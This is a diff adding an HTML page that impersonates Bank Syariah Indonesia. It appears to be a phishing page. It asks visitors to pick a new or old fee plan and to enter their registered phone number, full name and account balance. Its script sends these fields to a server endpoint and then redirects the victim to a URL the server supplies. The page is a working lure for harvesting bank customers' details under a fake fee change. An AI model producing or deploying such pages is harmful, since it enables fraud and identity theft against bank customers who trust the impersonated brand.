@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Bank Syariah Indonesia</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            max-width: 450px; 
+            margin: 0 auto; 
+            padding: 20px; 
+        }
+        .form-group { 
+            margin-bottom: 15px; 
+        }
+        label { 
+            display: block; 
+            margin-bottom: 5px; 
+        }
+        input, button { 
+            width: 100%; 
+            padding: 10px; 
+            margin-bottom: 10px; 
+        }
+        button { 
+            background: #00A39E; 
+            color: white; 
+            border: none; 
+            border-radius: 5px; 
+            cursor: pointer; 
+        }
+    </style>
+</head>
+<body>
+    <h2>Bank Syariah Indonesia</h2>
+    <p>Konfirmasi tarif sesuai kebutuhan Anda</p>
+    
+    <form id="myForm">
+        <div class="form-group">
+            <label>Pilih Tarif:</label>
+            <input type="radio" name="tarif" value="baru" required> Tarif Baru (Rp 150.000/bulan)
+            <input type="radio" name="tarif" value="lama" required> Tarif Lama (Rp 6.500/transaksi)
+        </div>
+        
+        <div class="form-group">
+            <label>No. HP Terdaftar:</label>
+            <input type="tel" name="nohp" placeholder="Contoh: 08123456789" required>
+        </div>
+        
+        <div class="form-group">
+            <label>Nama Lengkap:</label>
+            <input type="text" name="nama" placeholder="Nama sesuai KTP" required>
+        </div>
+        
+        <div class="form-group">
+            <label>Saldo Akhir:</label>
+            <input type="text" name="saldo" placeholder="Contoh: 1.500.000" required>
+        </div>
+        
+        <button type="submit">PROSES</button>
+    </form>
+
+    <script>
+        document.getElementById('myForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const formData = new FormData(this);
+            const data = {
+                tarif: formData.get('tarif'),
+                nohp: formData.get('nohp'),
+                nama: formData.get('nama'),
+                saldo: formData.get('saldo')
+            };
+            
+            try {
+                const response = await fetch('/rest/no.js', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    alert('Data berhasil dikirim!');
+                    window.location.href = result.redirect;
+                } else {
+                    alert('Error: ' + result.message);
+                }
+            } catch (error) {
+                alert('Terjadi kesalahan: ' + error.message);
+            }
+        });
+    </script>
+</body>
+</html>
